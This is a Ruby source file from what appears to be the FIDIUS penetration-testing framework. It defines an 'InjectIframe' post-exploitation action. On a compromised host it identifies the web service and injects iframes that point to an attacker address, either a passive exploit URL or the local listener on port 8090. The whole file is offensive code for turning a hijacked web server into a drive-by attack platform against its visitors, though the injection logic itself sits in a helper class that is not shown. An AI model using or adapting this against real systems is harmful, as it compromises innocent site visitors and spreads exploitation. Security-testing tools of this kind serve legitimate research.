module FIDIUS
  module Action
    module PostExploit

      autoload :Webserver,         'fidius/action/postexploit/webserver'

      class InjectIframe
        include FIDIUS::Action::PostExploit::PostExploit

        def get_loudness_host
          10
        end

        def get_loudness_net
          0
        end

        def autorun
          false
        end

        def id
          "injectIframe"
        end

        def args
          result = {0 => []}
          FIDIUS::Action::Exploit::Passive.instance.running_actions.each do | passive |
            result[0] << passive[:url]
          end
          result
        end

        def run session, host, *args
          address = args[0]
          unless address
            lhost = FIDIUS::Action::Session.get_lhost session
            address = "http://#{lhost}:8090"
          end
          puts "LHOST FOR WEBINJECTION: --------------- : #{address}"
          webserver_iframe = FIDIUS::Action::PostExploit::Webserver::IFrameInjection.new session, address
          webserver_iframe.identify_webservice
          webserver_iframe.inject_iframes
          # webserver_iframe.establish_port_fwd lhost # This does not work for now
        end

      end #class InjectIframe
    end #module PostExploit
  end #module Action
end #module FIDIUS
